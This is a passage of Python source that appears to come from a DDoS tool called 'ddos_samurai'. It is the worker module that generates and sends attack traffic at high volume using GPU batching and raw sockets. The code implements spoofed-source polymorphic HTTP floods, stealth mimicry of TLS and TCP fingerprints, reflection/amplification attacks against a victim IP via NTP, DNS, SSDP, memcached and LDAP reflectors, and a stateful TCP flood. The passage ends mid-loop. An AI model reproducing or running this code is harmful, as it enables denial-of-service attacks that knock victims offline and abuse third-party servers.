import asyncio
import time
import os
import logging
import multiprocessing
import random

from datetime import datetime

from ddos_samurai import packet
from ddos_samurai import senders
from ddos_samurai import stealth


from ddos_samurai import utils
from ddos_samurai.pacing import (
    PacingConfig, PacingMode, JitterModel,
    PACING_ENGINE_AVAILABLE,
)
log_info = utils.log_info
log_error = utils.log_error
log_warning = utils.log_warning


# Map CLI string values → enum values
_PACING_MODE_MAP = {
    "none": PacingMode.NONE,
    "rps": PacingMode.RPS,
    "ipg": PacingMode.IPG,
    "burst": PacingMode.BURST,
}
_JITTER_MODEL_MAP = {
    "none": JitterModel.NONE,
    "uniform": JitterModel.UNIFORM,
    "gaussian": JitterModel.GAUSSIAN,
    "exponential": JitterModel.EXPONENTIAL,
}


def _empty_stats() -> dict:
    return {
        "attempted": 0,
        "sent": 0,
        "errors": 0,
        "bytes_sent_est": 0,
        "buffer_copy_count": 0,
        "buffer_copy_bytes": 0,
        "eagain_retry_count": 0,
        "partial_send_retry_count": 0,
        "buffer_reuse_hits": 0,
        "txring_flush_call_count": 0,
        "txring_flush_error_count": 0,
        "txring_flush_eagain_count": 0,
        "txring_frame_wait_ns": 0,
        "txring_poll_count": 0,
        "flush_mode": "unknown",
        "txring_tp_packets": 0,
        "txring_tp_drops": 0,
        "txring_tp_freeze_q_cnt": 0,
        "txring_packet_version": 0,
        "txring_packet_version_name": "TPACKET_UNKNOWN",
        "host_tx_packets_delta": 0,
        "host_tx_dropped_delta": 0,
        "host_tx_errors_delta": 0,
        "softnet_dropped_delta": 0,
        "softnet_time_squeeze_delta": 0,
        "wire_loss_est_packets": 0,
        "wire_loss_est_pct": 0.0,
        "wire_loss_raw_packets": 0,
        "wire_loss_raw_pct": 0.0,
        "wire_loss_estimation_capped": 0,
        "txring_drop_ratio_pct": 0.0,
        "txring_flush_error_ratio_pct": 0.0,
        "txring_flush_eagain_ratio_pct": 0.0,
        "sender_path": "",
        "gpu_template_h2d_copy_count": 0,
        "gpu_template_h2d_copy_bytes": 0,
        "gpu_rng_state_alloc_count": 0,
        "gpu_rng_state_reuse_count": 0,
    }


def _recompute_loss_metrics(d: dict) -> dict:
    out = dict(d or {})
    attempted = max(0, int(out.get("attempted", 0) or 0))
    tx_packets = max(0, int(out.get("txring_tp_packets", 0) or 0))
    tx_drops = max(0, int(out.get("txring_tp_drops", 0) or 0))
    host_tx_dropped = max(0, int(out.get("host_tx_dropped_delta", 0) or 0))
    existing_est = max(0, int(out.get("wire_loss_est_packets", 0) or 0))
    existing_raw = max(0, int(out.get("wire_loss_raw_packets", 0) or 0))
    flush_calls = max(0, int(out.get("txring_flush_call_count", 0) or 0))
    flush_errors = max(0, int(out.get("txring_flush_error_count", 0) or 0))
    flush_eagain = max(0, int(out.get("txring_flush_eagain_count", 0) or 0))

    tx_drops_bounded = min(tx_drops, tx_packets) if tx_packets > 0 else tx_drops
    raw_loss_packets = max(existing_raw, tx_drops, host_tx_dropped)
    est_loss_packets = min(attempted, max(existing_est, tx_drops_bounded, host_tx_dropped))

    out["wire_loss_raw_packets"] = int(raw_loss_packets)
    out["wire_loss_raw_pct"] = float((100.0 * raw_loss_packets) / max(1, attempted))
    out["wire_loss_est_packets"] = int(est_loss_packets)
    out["wire_loss_est_pct"] = float((100.0 * est_loss_packets) / max(1, attempted))
    out["wire_loss_estimation_capped"] = int(raw_loss_packets > est_loss_packets)
    out["txring_drop_ratio_pct"] = float((100.0 * tx_drops_bounded) / max(1, tx_packets))
    out["txring_flush_error_ratio_pct"] = float((100.0 * flush_errors) / max(1, flush_calls))
    out["txring_flush_eagain_ratio_pct"] = float((100.0 * flush_eagain) / max(1, flush_calls))
    return out


def _add_stats(acc: dict, item: dict) -> dict:
    if not isinstance(item, dict):
        return acc
    acc["attempted"] = int(acc.get("attempted", 0)) + int(item.get("attempted", 0) or 0)
    acc["sent"] = int(acc.get("sent", 0)) + int(item.get("sent", 0) or 0)
    acc["errors"] = int(acc.get("errors", 0)) + int(item.get("errors", 0) or 0)
    acc["bytes_sent_est"] = int(acc.get("bytes_sent_est", 0)) + int(item.get("bytes_sent_est", 0) or 0)
    acc["buffer_copy_count"] = int(acc.get("buffer_copy_count", 0)) + int(item.get("buffer_copy_count", 0) or 0)
    acc["buffer_copy_bytes"] = int(acc.get("buffer_copy_bytes", 0)) + int(item.get("buffer_copy_bytes", 0) or 0)
    acc["eagain_retry_count"] = int(acc.get("eagain_retry_count", 0)) + int(item.get("eagain_retry_count", 0) or 0)
    acc["partial_send_retry_count"] = int(acc.get("partial_send_retry_count", 0)) + int(item.get("partial_send_retry_count", 0) or 0)
    acc["buffer_reuse_hits"] = int(acc.get("buffer_reuse_hits", 0)) + int(item.get("buffer_reuse_hits", 0) or 0)
    acc["txring_flush_call_count"] = int(acc.get("txring_flush_call_count", 0)) + int(item.get("txring_flush_call_count", 0) or 0)
    acc["txring_flush_error_count"] = int(acc.get("txring_flush_error_count", 0)) + int(item.get("txring_flush_error_count", 0) or 0)
    acc["txring_flush_eagain_count"] = int(acc.get("txring_flush_eagain_count", 0)) + int(item.get("txring_flush_eagain_count", 0) or 0)
    acc["txring_frame_wait_ns"] = int(acc.get("txring_frame_wait_ns", 0)) + int(item.get("txring_frame_wait_ns", 0) or 0)
    acc["txring_poll_count"] = int(acc.get("txring_poll_count", 0)) + int(item.get("txring_poll_count", 0) or 0)
    item_flush_mode = str(item.get("flush_mode", "") or "").strip()
    if item_flush_mode:
        curr_flush_mode = str(acc.get("flush_mode", "") or "").strip()
        if not curr_flush_mode or curr_flush_mode == "unknown":
            acc["flush_mode"] = item_flush_mode
        elif curr_flush_mode != item_flush_mode and curr_flush_mode != "mixed":
            acc["flush_mode"] = "mixed"
    acc["txring_tp_packets"] = int(acc.get("txring_tp_packets", 0)) + int(item.get("txring_tp_packets", 0) or 0)
    acc["txring_tp_drops"] = int(acc.get("txring_tp_drops", 0)) + int(item.get("txring_tp_drops", 0) or 0)
    acc["txring_tp_freeze_q_cnt"] = int(acc.get("txring_tp_freeze_q_cnt", 0)) + int(item.get("txring_tp_freeze_q_cnt", 0) or 0)
    item_txring_ver = int(item.get("txring_packet_version", 0) or 0)
    item_txring_ver_name = str(item.get("txring_packet_version_name", "") or "").strip()
    if item_txring_ver > 0:
        current_ver = int(acc.get("txring_packet_version", 0) or 0)
        current_ver_name = str(acc.get("txring_packet_version_name", "") or "").strip()
        if current_ver <= 0:
            acc["txring_packet_version"] = item_txring_ver
            acc["txring_packet_version_name"] = item_txring_ver_name or "TPACKET_UNKNOWN"
        elif current_ver != item_txring_ver:
            acc["txring_packet_version"] = 0
            acc["txring_packet_version_name"] = "MIXED"
        elif not current_ver_name:
            acc["txring_packet_version_name"] = item_txring_ver_name or "TPACKET_UNKNOWN"
    acc["host_tx_packets_delta"] = int(acc.get("host_tx_packets_delta", 0)) + int(item.get("host_tx_packets_delta", 0) or 0)
    acc["host_tx_dropped_delta"] = int(acc.get("host_tx_dropped_delta", 0)) + int(item.get("host_tx_dropped_delta", 0) or 0)
    acc["host_tx_errors_delta"] = int(acc.get("host_tx_errors_delta", 0)) + int(item.get("host_tx_errors_delta", 0) or 0)
    acc["softnet_dropped_delta"] = int(acc.get("softnet_dropped_delta", 0)) + int(item.get("softnet_dropped_delta", 0) or 0)
    acc["softnet_time_squeeze_delta"] = int(acc.get("softnet_time_squeeze_delta", 0)) + int(item.get("softnet_time_squeeze_delta", 0) or 0)
    acc["wire_loss_est_packets"] = int(acc.get("wire_loss_est_packets", 0)) + int(item.get("wire_loss_est_packets", 0) or 0)
    acc["wire_loss_raw_packets"] = int(acc.get("wire_loss_raw_packets", 0)) + int(item.get("wire_loss_raw_packets", 0) or 0)
    acc["gpu_template_h2d_copy_count"] = int(acc.get("gpu_template_h2d_copy_count", 0)) + int(item.get("gpu_template_h2d_copy_count", 0) or 0)
    acc["gpu_template_h2d_copy_bytes"] = int(acc.get("gpu_template_h2d_copy_bytes", 0)) + int(item.get("gpu_template_h2d_copy_bytes", 0) or 0)
    acc["gpu_rng_state_alloc_count"] = int(acc.get("gpu_rng_state_alloc_count", 0)) + int(item.get("gpu_rng_state_alloc_count", 0) or 0)
    acc["gpu_rng_state_reuse_count"] = int(acc.get("gpu_rng_state_reuse_count", 0)) + int(item.get("gpu_rng_state_reuse_count", 0) or 0)
    item_sender_path = str(item.get("sender_path", "") or "").strip()
    if item_sender_path:
        current = str(acc.get("sender_path", "") or "").strip()
        if not current:
            acc["sender_path"] = item_sender_path
        elif current != item_sender_path and current != "MIXED":
            acc["sender_path"] = "MIXED"
    return _recompute_loss_metrics(acc)


def _build_pacing_config(args: dict) -> PacingConfig:
    """Build a PacingConfig from worker args dict (CLI values)."""
    mode = _PACING_MODE_MAP.get(args.get("pacing_mode", "none"), PacingMode.NONE)

    # Auto-promote: if --rps is set but --pacing-mode is "none", use RPS mode
    if mode == PacingMode.NONE and args.get("rps", 0) > 0:
        mode = PacingMode.RPS

    return PacingConfig(
        pacing_mode   = mode,
        target_rps    = float(args.get("rps", 0)),
        ipg_ns        = int(args.get("ipg", 0)),
        burst_size    = int(args.get("burst_size", 64)),
        burst_gap_ns  = int(args.get("burst_gap", 0)),
        jitter_model  = _JITTER_MODEL_MAP.get(args.get("jitter_model", "none"), JitterModel.NONE),
        jitter_pct    = float(args.get("jitter_pct", 0.0)),
        pin_cpu       = int(args.get("pin_cpu", -1)),
        use_so_txtime = bool(args.get("use_so_txtime", False)),
    )


def start_worker(
    worker_id,
    args,
    progress=None,
    progress_lock=None,
    tls_profile="none",
    run_events=None,
    sent_total=None,
    errors_total=None,
    resource_stats=None,
):
    """Synchronous entry point for a worker process."""
    # --- CPU Pinning (TRex Style) ---
    try:
        cpu_count = multiprocessing.cpu_count()
        # Reserve CPU 0 for OS/Management if possible, otherwise use all
        if cpu_count > 1:
            # Simple round-robin: (worker_id % (total_cpus - 1)) + 1
            # This ensures we skip CPU 0 but wrap around if workers > cpus
            cpu_id = (worker_id % (cpu_count - 1)) + 1
        else:
            cpu_id = 0
            
        # Log which CPU this worker is pinned to
        # print(f"[Worker {worker_id}] Pinned to CPU {cpu_id}")

            
        os.sched_setaffinity(0, {cpu_id})
        # We use print here because logging might not be fully set up or to ensure visibility
        # log_info is defined below but available in module scope
    except Exception as e:
        print(f"[Worker {worker_id}] Failed to set CPU affinity: {e}")

    try:
        asyncio.run(
            worker_process(
                worker_id,
                args,
                progress,
                progress_lock,
                tls_profile,
                run_events=run_events,
                sent_total=sent_total,
                errors_total=errors_total,
                resource_stats=resource_stats,
            )
        )
    except KeyboardInterrupt:
        pass

async def worker_process(
    worker_id,
    args,
    progress=None,
    progress_lock=None,
    tls_profile="none",
    ssl_context=None,
    run_events=None,
    sent_total=None,
    errors_total=None,
    resource_stats=None,
):
    """
    Worker process target: runs the selected attack vector using senders module.
    """
    # Create SSL context inside the worker if needed (cannot be pickled)
    effective_tls_profile = tls_profile
    if effective_tls_profile == "none":
        effective_tls_profile = args.get("tls_profile", args.get("ja3_profile", "none"))
    if ssl_context is None and effective_tls_profile != "none":
        ssl_context = stealth.create_ja3_context(effective_tls_profile)
    log_info(f"[Worker {worker_id}] süreci başlatıldı (PID: {os.getpid()}). Görev: {args['count']} paket/istek.")
    worker_started = time.time()
    worker_status = "ok"
    worker_error = ""
    backend_used = "cpu"
    worker_stats = _empty_stats()
    _gpu_packet_mod = None

    fault_inject_set = {
        str(x).strip().lower()
        for x in (args.get("fault_inject", []) or [])
        if str(x).strip()
    }
    if "mix" in fault_inject_set:
        fault_inject_set.update({"sender-restart", "nic-blip", "gpu-stream-error"})
    fault_after_s = float(args.get("fault_after_s", 0) or 0)
    fault_duration_s = max(0.0, float(args.get("fault_duration_s", 2.0) or 0.0))
    fault_done = set()

    def _read_rss_bytes() -> int:
        try:
            with open("/proc/self/statm", "r", encoding="utf-8") as f:
                parts = f.read().strip().split()
            if len(parts) >= 2:
                rss_pages = int(parts[1])
                return int(rss_pages * os.sysconf("SC_PAGE_SIZE"))
        except Exception:
            pass
        return 0

    def _shared_counters_snapshot():
        p_val = 0
        s_val = 0
        e_val = 0
        try:
            if progress_lock is not None:
                with progress_lock:
                    p_val = int(getattr(progress, "value", 0) or 0)
                    s_val = int(getattr(sent_total, "value", 0) or 0)
                    e_val = int(getattr(errors_total, "value", 0) or 0)
            else:
                p_val = int(getattr(progress, "value", 0) or 0)
                s_val = int(getattr(sent_total, "value", 0) or 0)
                e_val = int(getattr(errors_total, "value", 0) or 0)
        except Exception:
            pass
        return p_val, s_val, e_val

    _last_resource_emit = 0.0

    def _update_resource_stats(force: bool = False):
        nonlocal _last_resource_emit
        if resource_stats is None:
            return
        now = time.time()
        if not force and (now - _last_resource_emit) < 5.0:
            return
        _last_resource_emit = now

        vram_used = 0
        vram_total = 0
        pinned_bytes = 0
        pinned_buffers = 0
        gpu_pool_buffers = 0
        gpu_pool_in_use = 0

        if _gpu_packet_mod is not None:
            try:
                gstats = _gpu_packet_mod.get_memory_pool().get_stats()
                vram_used = int(gstats.get("used_bytes", 0) or 0)
                vram_total = int(gstats.get("total_bytes", 0) or 0)
                gpu_pool_buffers = int(gstats.get("buffers_allocated", 0) or 0)
                gpu_pool_in_use = int(gstats.get("buffers_in_use", 0) or 0)
            except Exception:
                pass
            try:
                pstats = _gpu_packet_mod.get_pinned_host_pool().get_stats()
                pinned_bytes = int(pstats.get("total_nbytes", 0) or 0)
                pinned_buffers = int(pstats.get("buffers_allocated", 0) or 0)
            except Exception:
                pass

        p_val, s_val, e_val = _shared_counters_snapshot()
        backlog = max(0, int(p_val) - int(s_val) - int(e_val))
        try:
            resource_stats[int(worker_id)] = {
                "ts": float(now),
                "rss_bytes": int(_read_rss_bytes()),
                "vram_used_bytes": int(vram_used),
                "vram_total_bytes": int(vram_total),
                "pinned_bytes": int(pinned_bytes),
                "pinned_buffers": int(pinned_buffers),
                "gpu_pool_buffers": int(gpu_pool_buffers),
                "gpu_pool_in_use": int(gpu_pool_in_use),
                "backlog": int(backlog),
                "backend": str(backend_used),
            }
        except Exception:
            pass

    _orig_paced_sender = senders.paced_raw_socket_sender

    async def _paced_sender_with_faults(
        *,
        packets_buffer,
        target_ip,
        target_port,
        count,
        verbose,
        pacing_config=None,
        live_sent=None,
        live_errors=None,
        live_progress=None,
    ):
        elapsed = max(0.0, time.time() - worker_started)
        can_inject = fault_after_s > 0 and elapsed >= fault_after_s
        if can_inject and "nic-blip" in fault_inject_set and "nic-blip" not in fault_done:
            fault_done.add("nic-blip")
            log_warning(
                f"[Worker {worker_id}] FaultInject NIC blip: {fault_duration_s:.1f}s send pause."
            )
            await asyncio.sleep(fault_duration_s)
        if can_inject and "sender-restart" in fault_inject_set and "sender-restart" not in fault_done:
            fault_done.add("sender-restart")
            log_warning(f"[Worker {worker_id}] FaultInject sender restart simulated.")
            await asyncio.sleep(min(1.0, fault_duration_s))
        if can_inject and "gpu-stream-error" in fault_inject_set and "gpu-stream-error" not in fault_done:
            if args.get("compute_backend") == "cuda":
                fault_done.add("gpu-stream-error")
                log_warning(f"[Worker {worker_id}] FaultInject GPU stream error simulated (one batch drop).")
                _update_resource_stats(force=True)
                return {
                    "attempted": int(count),
                    "sent": 0,
                    "errors": int(count),
                    "bytes_sent_est": 0,
                }

        out = await _orig_paced_sender(
            packets_buffer=packets_buffer,
            target_ip=target_ip,
            target_port=target_port,
            count=count,
            verbose=verbose,
            pacing_config=pacing_config,
            live_sent=live_sent,
            live_errors=live_errors,
            live_progress=live_progress,
        )
        _update_resource_stats(force=False)
        return out

    senders.paced_raw_socket_sender = _paced_sender_with_faults
    _update_resource_stats(force=True)

    _resource_monitor_stop = False

    async def _resource_monitor_loop():
        while not _resource_monitor_stop:
            try:
                _update_resource_stats(force=True)
            except Exception:
                pass
            await asyncio.sleep(5.0)

    _resource_monitor_task = asyncio.create_task(_resource_monitor_loop())

    # Build pacing config from CLI args
    pacing_cfg = _build_pacing_config(args)
    if pacing_cfg.pacing_mode != PacingMode.NONE:
        log_info(f"[Worker {worker_id}] Pacing: mode={pacing_cfg.pacing_mode.name}, "
                 f"rps={pacing_cfg.target_rps:.0f}, ipg={pacing_cfg.ipg_ns}ns, "
                 f"burst={pacing_cfg.burst_size}, jitter={pacing_cfg.jitter_model.name}")
        if PACING_ENGINE_AVAILABLE:
            log_info(f"[Worker {worker_id}] C pacing engine aktif.")
        else:
            log_warning(f"[Worker {worker_id}] C pacing engine yok, Python fallback kullanılacak.")

    try:
        import uvloop
        uvloop.install()
    except Exception:
        pass

    try:
        use_cuda = False
        if args.get('compute_backend') == 'cuda':
            try:
                from numba import cuda as numba_cuda
                if numba_cuda.is_available():
                    use_cuda = True
                else:
                    log_warning("CUDA device not found. Falling back to CPU.")
            except ImportError:
                log_warning("Numba/CUDA module not installed. Falling back to CPU.")
            except Exception as e:
                log_warning(f"CUDA initialization failed: {e}. Falling back to CPU.")

        if use_cuda:
            backend_used = "cuda"
            # LAZY IMPORT for GPU modules
            # NOTE: do not import `senders` here; it shadows the outer module name and
            # breaks CPU paths due to Python's local-variable scoping rules.
            from . import gpu_packet, gpu_payload
            _gpu_packet_mod = gpu_packet
            from .utils import get_gateway_mac, mac_to_int
            # numba_cuda is imported above
            import cupy as cp

            def _gpu_to_host(gpu_arr, key: str, stream=None, blocking: bool = True):
                """Copy GPU array to host via shared pinned-memory pool."""
                pool_key = f"worker{worker_id}:{key}"
                return gpu_packet.copy_gpu_to_host_pinned(
                    gpu_arr,
                    key=pool_key,
                    stream=stream,
                    blocking=blocking,
                )

            async def _await_cuda_event(evt):
                """Async wait for CUDA event without hard CPU blocking."""
                try:
                    while not evt.query():
                        await asyncio.sleep(0)
                except Exception:
                    # Conservative fallback for environments without query()
                    evt.synchronize()
            
            # Re-import senders as something else if needed, OR relies on top-level import
            # The error is likely because `senders` was imported inside this block in a previous version
            # causing it to be treated as local.
            # We will use the top-level `ddos_samurai.senders` or just `senders` from line 11.
            
            # IP Conversion
            target_ip_int = int(sum([int(x) << (24 - i*8) for i, x in enumerate(args['target'].split('.'))]))
            real_src_ip = args.get('spoof_ip', "192.168.1.100")
            if not real_src_ip: real_src_ip = "192.168.1.100"
            real_src_ip_int = int(sum([int(x) << (24 - i*8) for i, x in enumerate(real_src_ip.split('.'))]))

            # --- NEW: GPU Payload Engine for HTTP ---
            if args['attack_vector'] == 'http':
                log_info("Initializing GPU Payload Engine (Polymorphic HTTP)...")

                # Fragmentation on the GPU path is not supported in this build.
                # Keep CPU/Scapy fragmentation (see ddos_samurai.senders.packet_sender).
                if args.get('fragment', False):
                    log_warning("GPU backend için --fragment şu an desteklenmiyor; görmezden geliniyor.")

                # P2 FIX #19: Resolve Gateway MAC
                gw_mac_str = get_gateway_mac(args['target'])
                gw_mac_int = mac_to_int(gw_mac_str)

                # --- NEW: TCP Mimicry Synchronization ---
                profile_name = args.get("tls_profile", args.get("ja3_profile", "chrome_120"))
                tcp_params = stealth.get_tcp_params(profile_name)

                win_val = tcp_params['window']
                mss_val = tcp_params['mss']
                ttl_val = tcp_params['ttl']

                stream_ring = [
                    cp.cuda.Stream(non_blocking=True),
                    cp.cuda.Stream(non_blocking=True),
                    cp.cuda.Stream(non_blocking=True),
                ]
                stream_idx = 0
                ready_queue = []

                BATCH_SIZE = int(os.environ.get("SAMURAI_GPU_BATCH", 100000))
                remaining = args['count']
                payload_engine = gpu_payload.GPUPayloadEngine(BATCH_SIZE)

                # Load custom wordlists once per worker/engine.
                if args.get('http_path') and isinstance(args['http_path'], list):
                    payload_engine.load_custom_wordlists(paths=args['http_path'])

                window_sizes_full = cp.empty(BATCH_SIZE, dtype=cp.uint16)
                window_sizes_full.fill(win_val)
                mss_values_full = cp.empty(BATCH_SIZE, dtype=cp.uint16)
                mss_values_full.fill(mss_val)
                ttls_full = cp.empty(BATCH_SIZE, dtype=cp.uint8)
                ttls_full.fill(ttl_val)

                while remaining > 0:
                    batch_count = min(remaining, BATCH_SIZE)
                    payload_engine.count = batch_count
                    window_sizes = window_sizes_full[:batch_count]
                    mss_values = mss_values_full[:batch_count]
                    ttls = ttls_full[:batch_count]

                    packets_gpu_array, packet_size = payload_engine.generate_fused_http(
                        target_ip=args['target'],
                        target_port=args['port'],
                        real_src_ip=real_src_ip,
                        spoof_ip=args['spoof'],
                        stream=stream_ring[stream_idx],
                        gateway_mac=gw_mac_int,
                        spoof_subnet=args.get('spoof_subnet', '1.0.0.0/8'),
                        current_time=int(time.time() * 1000),
                        window_sizes=window_sizes,
                        mss_values=mss_values,
                        ttls=ttls
                    )
                    active_gpu = packets_gpu_array[: batch_count * packet_size]

                    current_batch = {
                        "cpu": _gpu_to_host(
                            active_gpu,
                            f"http_fused_slot{stream_idx}",
                            stream=stream_ring[stream_idx],
                            blocking=False,
                        ),
                        "count": batch_count,
                        "stream": stream_ring[stream_idx],
                        "slot": stream_idx,
                        "ready_event": cp.cuda.Event(),
                    }
                    current_batch["ready_event"].record(current_batch["stream"])
                    ready_queue.append(current_batch)
                    stream_idx = (stream_idx + 1) % 3
                    remaining -= batch_count

                    if len(ready_queue) >= 2:
                        send_batch = ready_queue.pop(0)
                        await _await_cuda_event(send_batch["ready_event"])
                        worker_stats = _add_stats(worker_stats, await senders.paced_raw_socket_sender(
                            packets_buffer=send_batch["cpu"],
                            target_ip=args['target'],
                            target_port=args['port'],
                            count=send_batch["count"],
                            verbose=args['verbose'],
                            pacing_config=pacing_cfg,
                            live_sent=sent_total,
                            live_errors=errors_total,
                            live_progress=progress
                        ))

                    await asyncio.sleep(0)

                while ready_queue:
                    send_batch = ready_queue.pop(0)
                    await _await_cuda_event(send_batch["ready_event"])
                    worker_stats = _add_stats(worker_stats, await senders.paced_raw_socket_sender(
                        packets_buffer=send_batch["cpu"],
                        target_ip=args['target'],
                        target_port=args['port'],
                        count=send_batch["count"],
                        verbose=args['verbose'],
                        pacing_config=pacing_cfg,
                        live_sent=sent_total,
                        live_errors=errors_total,
                        live_progress=progress
                    ))
                return

            # --- AMPLIFICATION MODE (GPU) ---
            if args['attack_vector'] in ["ntp-amp", "ssdp-amp", "dns-amp", "memcached-amp", "ldap-amp"]:
                log_info(f"Initializing GPU Amplification Attack ({args['attack_vector']})...")
                
                # 1. Load Reflectors
                reflector_file = args.get('reflector_file')
                if not reflector_file:
                    log_error("Reflector file is required for amplification attacks!")
                    return

                reflectors = []
                try:
                    with open(reflector_file, 'r') as f:
                        for line in f:
                            line = line.strip()
                            if line and not line.startswith('#'):
                                reflectors.append(line)
                except Exception as e:
                    log_error(f"Failed to load reflectors: {e}")
                    return
                
                if not reflectors:
                    log_error("No reflectors found in file!")
                    return
                
                log_info(f"Loaded {len(reflectors)} reflectors.")
                
                # Keep only valid reflector IPs
                valid_reflectors = []
                for ip in reflectors:
                    try:
                        _ = int(sum([int(x) << (24 - i*8) for i, x in enumerate(ip.split('.'))]))
                        valid_reflectors.append(ip)
                    except:
                        pass
                
                if not valid_reflectors:
                    log_error("No valid reflector IPs found!")
                    return

                # 2. Create Template (CPU)
                dummy_reflector = valid_reflectors[0]
                victim_ip = args['target']
                
                if args['attack_vector'] == "dns-amp":
                    pkt = packet.create_dns_amp_packet(dummy_reflector, victim_ip, args['dns_name'])
                elif args['attack_vector'] == "ntp-amp":
                    pkt = packet.create_ntp_amp_packet(dummy_reflector, victim_ip)
                elif args['attack_vector'] == "ssdp-amp":
                    pkt = packet.create_ssdp_amp_packet(dummy_reflector, victim_ip)
                elif args['attack_vector'] == "memcached-amp":
                    pkt = packet.create_memcached_amp_packet(dummy_reflector, victim_ip)
                elif args['attack_vector'] == "ldap-amp":
                    pkt = packet.create_ldap_amp_packet(dummy_reflector, victim_ip)
                else:
                    pkt = packet.create_dns_amp_packet(dummy_reflector, victim_ip) # Fallback
                
                # Add Ethernet Header (Required for TX_RING)
                full_bytes = bytes(pkt)
                has_ether_in_bytes = (len(full_bytes) >= 34 and (full_bytes[14] & 0xF0) == 0x40)
                
                if not has_ether_in_bytes:
                    try:
                        iface, gw_mac_bytes = senders.get_gateway_info(victim_ip)
                        if not gw_mac_bytes:
                            dst_mac_bytes = b'\xff\xff\xff\xff\xff\xff'
                            iface = "eth0"
                        else:
                            dst_mac_bytes = gw_mac_bytes

                        from scapy.all import get_if_hwaddr
                        try:
                            src_mac_str = get_if_hwaddr(iface)
                            clean_src_mac = src_mac_str.strip().replace(':', '').replace('-', '').replace(' ', '')
                            src_mac_bytes = bytes.fromhex(clean_src_mac)
                        except:
                            src_mac_bytes = b'\x00\x00\x00\x00\x00\x00'
                            
                        eth_type = b'\x08\x00'
                        t_bytes = dst_mac_bytes + src_mac_bytes + eth_type + full_bytes
                    except Exception as e:
                        t_bytes = b'\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x08\x00' + full_bytes
                else:
                    t_bytes = full_bytes

                try:
                    gw_mac_int = mac_to_int(get_gateway_mac(victim_ip))
                except Exception:
                    gw_mac_int = 0xFFFFFFFFFFFF
                stream_ring = [
                    cp.cuda.Stream(non_blocking=True),
                    cp.cuda.Stream(non_blocking=True),
                    cp.cuda.Stream(non_blocking=True),
                ]
                stream_idx = 0
                ready_queue = []
                BATCH_SIZE = int(os.environ.get("SAMURAI_GPU_BATCH", 100000))
                remaining = args['count']

                while remaining > 0:
                    batch_count = min(remaining, BATCH_SIZE)
                    packets_gpu_array, packet_size = gpu_packet.generate_amplification_packets(
                        template_bytes=t_bytes,
                        reflectors_ips=valid_reflectors,
                        victim_ip=victim_ip,
                        count=batch_count,
                        has_ethernet=True,
                        stream=stream_ring[stream_idx],
                        gateway_mac=gw_mac_int,
                    )
                    current_batch = {
                        "cpu": _gpu_to_host(
                            packets_gpu_array,
                            f"amp_slot{stream_idx}",
                            stream=stream_ring[stream_idx],
                            blocking=False,
                        ),
                        "count": batch_count,
                        "stream": stream_ring[stream_idx],
                        "slot": stream_idx,
                        "ready_event": cp.cuda.Event(),
                    }
                    current_batch["ready_event"].record(current_batch["stream"])
                    ready_queue.append(current_batch)
                    stream_idx = (stream_idx + 1) % 3
                    remaining -= batch_count

                    if len(ready_queue) >= 2:
                        send_batch = ready_queue.pop(0)
                        await _await_cuda_event(send_batch["ready_event"])
                        worker_stats = _add_stats(worker_stats, await senders.paced_raw_socket_sender(
                            packets_buffer=send_batch["cpu"],
                            target_ip=args['target'],
                            target_port=0,
                            count=send_batch["count"],
                            verbose=args['verbose'],
                            pacing_config=pacing_cfg,
                            live_sent=sent_total,
                            live_errors=errors_total,
                            live_progress=progress
                        ))

                    await asyncio.sleep(0)

                while ready_queue:
                    send_batch = ready_queue.pop(0)
                    await _await_cuda_event(send_batch["ready_event"])
                    worker_stats = _add_stats(worker_stats, await senders.paced_raw_socket_sender(
                        packets_buffer=send_batch["cpu"],
                        target_ip=args['target'],
                        target_port=0,
                        count=send_batch["count"],
                        verbose=args['verbose'],
                        pacing_config=pacing_cfg,
                        live_sent=sent_total,
                        live_errors=errors_total,
                        live_progress=progress
                    ))
                return

            # --- STATEFUL TCP MODE ---
            if args.get('stateful', False):
                log_info("Initializing Stateful TCP Engine (Viper-State)...")
                
                # 1. Start RX Handler (C Extension)
                iface, gw_mac_bytes = senders.get_gateway_info(args['target'])
                
                # Handle None case gracefully
                if not gw_mac_bytes:
                    log_warning("Gateway MAC resolve edilemedi, broadcast MAC kullanılıyor...")
                    gw_mac_bytes = b'\xff\xff\xff\xff\xff\xff'
                    if not iface:
                        iface = "eth0"  # Fallback interface
                
                senders.fast_sender.start_rx_handler(iface)
                
                # 2. Prepare Templates (Ensure consistent size)
                template_pool = []
                max_t_size = 0
                raw_templates = []
                
                for _ in range(10):
                    pkt_config = packet.PacketConfig(
                        target_ip=args['target'], 
                        target_port=args['port'],
                        protocol='tcp',
                        spoof=False,
                        tcp_flags='S',
                        attack_vector='basic'
                    )
                    template_pkt = packet.create_packet(pkt_config)
                    t_bytes = bytes(template_pkt)
                    
                    # Robust Ethernet Check: Check first nibble for IP version 4
                    # If it's 0x45, it's likely an IP packet without Ethernet
                    if (t_bytes[0] & 0xF0) == 0x40:
                        t_bytes = gw_mac_bytes + b'\x00'*6 + b'\x08\x00' + t_bytes
                    
                    raw_templates.append(t_bytes)
                    if len(t_bytes) > max_t_size:
                        max_t_size = len(t_bytes)
                
                # Pad all templates to max_t_size
                actual_lengths = []
                for t in raw_templates:
                    actual_lengths.append(len(t))
                    if len(t) < max_t_size:
                        t += b'\x00' * (max_t_size - len(t))
                    template_pool.append(t)

                # 3. Main Loop (one-batch-ahead pipeline)
                stream_ring = [
                    cp.cuda.Stream(non_blocking=True),
                    cp.cuda.Stream(non_blocking=True),
                    cp.cuda.Stream(non_blocking=True),
                ]
                stream_idx = 0
                gw_mac_int = utils.mac_to_int(utils.get_gateway_mac(args['target']))
                
                # Get actual local IP for state lookup
                import socket
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                try:
                    s.connect((args['target'], 80))
                    local_ip = s.getsockname()[0]
                except Exception:
                    local_ip = real_src_ip
                finally:
                    s.close()
                local_ip_int = int(sum([int(x) << (24 - i*8) for i, x in enumerate(local_ip.split('.'))]))
                log_info(f"Using local IP {local_ip} for state tracking.")

                start_time = time.time()
                packets_sent = 0
                
                # Partition source ports by worker_id to avoid state table collisions
                # Total available ports: 65535 - 1024 = 64511
                # Each worker gets a slice of the port range
                num_workers = args.get('workers', 1)
                ports_per_worker = 64511 // num_workers
                start_port = 1024 + (worker_id * ports_per_worker)
                
                ready_queue = []
                while True:
                    # Poll State Table in BATCH (C Extension)
                    # We use local_ip_int for lookup and the worker's specific start_port
                    seq_list, ack_list, state_list, win_list, mss_list, ttl_list = senders.fast_sender.get_states_batch(
                        local_ip_int, start_port, args['count']
                    )

                    # Generate next batch first so GPU can run while previous batch is sent.
